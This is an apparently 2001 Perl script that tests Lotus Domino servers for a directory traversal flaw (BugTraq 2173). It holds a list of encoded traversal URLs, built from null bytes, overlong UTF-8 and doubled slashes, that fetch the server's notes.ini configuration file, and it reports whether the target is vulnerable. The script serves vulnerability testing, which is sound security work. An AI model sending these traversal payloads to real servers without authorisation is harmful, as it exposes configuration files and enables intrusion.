#!/usr/bin/perl
# PERL script to test a Domino server for directory
# traversal vulnerability.  (BugTraq ID 2173,
# http://www.securityfocus.com/bid/2173)
#
# Michael Smith, http://www.netlocksmith.com
# 01/15/2001
#
# Credit & thanks to all of these folks:
#
# - To Georgi Guninski, http://www.guninski.com,
#   who discovered the original vulnerability,
#   and Ralph Moonen of KPMG, who found additional
#   URL variations
#
# - Roelof Temmingh, http://www.sensepost.com,
#   author of unicodecheck.pl, on which this
#   script is based
#
# - Rain Forest Puppy, http://www.wiretrip.com,
#   author of Sendraw routine
#
use Socket;
# --------------init
if ($#ARGV<0) {die "Usage: nsfcheck targetIP[:port]";}
($host,$port)=split(/:/,@ARGV[0]);
if ($port=="") {$port=80;}
print "Testing $host:$port\n";
$target = inet_aton($host);

@notesvuln=(	"/%00%00.nsf/../lotus/domino/notes.ini",
		"/%00%20.nsf/../lotus/domino/notes.ini",
		"/%00%c0%af.nsf/../lotus/domino/notes.ini",
		"/%00...nsf/../lotus/domino/notes.ini",
		"/%00.nsf//../lotus/domino/notes.ini",
		"/%00.nsf/../lotus/domino/notes.ini",
		"/%00.nsf/..//lotus/domino/notes.ini",
		"/%00.nsf/../../lotus/domino/notes.ini",
		"/%00.nsf.nsf/../lotus/domino/notes.ini",
		"/%20%00.nsf/../lotus/domino/notes.ini",
		"/%20.nsf//../lotus/domino/notes.ini",
		"/%20.nsf/..//lotus/domino/notes.ini",
		"/%c0%af%00.nsf/../lotus/domino/notes.ini",
		"/%c0%af.nsf//../lotus/domino/notes.ini",
		"/%c0%af.nsf/..//lotus/domino/notes.ini",
		"/...nsf//../lotus/domino/notes.ini",
		"/...nsf/..//lotus/domino/notes.ini",
		"/.nsf///../lotus/domino/notes.ini",
		"/.nsf//../lotus/domino/notes.ini",
		"/.nsf//..//lotus/domino/notes.ini",
		"/.nsf/../lotus/domino/notes.ini",
		"/.nsf/../lotus/domino/notes.ini",
		"/.nsf/..///lotus/domino/notes.ini",
		"/.nsf%00.nsf/../lotus/domino/notes.ini",
		"/.nsf.nsf//../lotus/domino/notes.ini",
		"/.nsf.nsf/..//lotus/domino/notes.ini");

# ----- Test each possible version of vulnerability -----
foreach $notespath (@notesvuln) {
   my @results=sendraw("GET ".$notespath." HTTP\/1.0\r\n\r\n");
   foreach $line (@results){
      if ($line =~ /\[Notes\]/) {$flag=1;}
   }
}
if ($flag==0) {die("No vulnerability found at this address.\n");}
else {die("This site is vulnerable.\n");}

# ------------- Sendraw
sub sendraw {
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}
# ---------------------- 